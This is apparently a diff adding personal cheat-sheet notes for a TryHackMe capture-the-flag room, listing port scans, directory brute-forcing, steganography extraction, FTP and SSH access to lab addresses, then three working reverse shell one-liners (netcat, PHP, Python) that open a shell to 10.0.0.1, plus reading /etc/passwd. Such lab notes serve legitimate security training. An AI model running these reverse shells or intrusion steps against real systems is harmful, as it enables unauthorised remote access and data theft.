@@ -1,0 +1,34 @@
+nmap -sV -sC 10.10.117.140
+rustscan -a 10.10.117.140
+nmap -p 21,22,80 -sV 10.10.117.140
+
+gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://psychobreak/SafeHeaven
+dirsearch -u 10.10.117.140
+ffuf -u http://10.10.167.133/SafeHeaven/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -recursion
+
+steghide extract -sf Joseph_Oda.jpg
+
+ftp 10.10.117.140
+ls -la
+mget file
+
+ssh kidman@10.10.117.140 
+find / -name *the_eye_of_ruvik* 2>/dev/null
+
+try to use:
+cat /etc/passwd
+ls -la
+ls ../
+ls ../../
+pwd
+id
+
+Reverse Shell codes:
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 4242 >/tmp/f
+php -r '$sock=fsockopen("10.0.0.1",4242);$proc=proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'
+export RHOST="10.0.0.1";export RPORT=4242;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
+
+https://github.com/0xNirvana/Writeups/blob/master/TryHackMe/Easy/psychoBreak/psychobreak.md
+https://octothorp88.medium.com/tryhackme-psycho-break-2784c4fd0ce6
+https://yebberdog.medium.com/tryhackme-psycho-break-walkthrough-522187308f06
+
